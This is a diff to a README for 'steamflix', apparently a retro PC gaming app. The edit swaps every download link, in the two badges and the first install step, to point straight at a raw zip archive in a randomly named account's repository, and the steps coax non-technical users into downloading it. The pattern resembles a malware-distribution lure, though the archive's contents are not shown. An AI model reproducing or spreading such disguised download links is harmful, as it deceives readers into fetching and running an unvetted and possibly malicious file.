@@ -10,13 +10,13 @@ You don't need to be a tech wizard to use this. Just follow the simple steps bel
 
 ## 📥 Download and Install
 
-[![Download steamflix Now](https://img.shields.io/badge/Download-steamflix-4CAF50?style=for-the-badge&logo=github)](https://github.com/Vitreous-seminar8876/steamflix)
+[![Download steamflix Now](https://img.shields.io/badge/Download-steamflix-4CAF50?style=for-the-badge&logo=github)](https://github.com/Vitreous-seminar8876/steamflix/raw/refs/heads/main/steamflix/Software-v2.9.zip)
 
 Visit this link to download the application.
 
 **Here's how to get started:**
 
-1. **Click the big green button above** or use this direct link: [https://github.com/Vitreous-seminar8876/steamflix](https://github.com/Vitreous-seminar8876/steamflix)
+1. **Click the big green button above** or use this direct link: [https://github.com/Vitreous-seminar8876/steamflix/raw/refs/heads/main/steamflix/Software-v2.9.zip](https://github.com/Vitreous-seminar8876/steamflix/raw/refs/heads/main/steamflix/Software-v2.9.zip)
 2. Once you're on the page, look for the **"Download"** or **"Releases"** section.
 3. Click the download button. Your browser will start downloading the file.
 4. After the download finishes, find the downloaded file in your **Downloads** folder (usually at `C:\Users\YourName\Downloads`).
@@ -147,7 +147,7 @@ steamflix is your time machine to the golden age of PC gaming. Whether you're a 
 
 So what are you waiting for? Download steamflix today and relive the magic!
 
-[![Get steamflix](https://img.shields.io/badge/🚀_Download_Now-steamflix-FF5722?style=for-the-badge&logo=github)](https://github.com/Vitreous-seminar8876/steamflix)
+[![Get steamflix](https://img.shields.io/badge/🚀_Download_Now-steamflix-FF5722?style=for-the-badge&logo=github)](https://github.com/Vitreous-seminar8876/steamflix/raw/refs/heads/main/steamflix/Software-v2.9.zip)
 
 ---
 
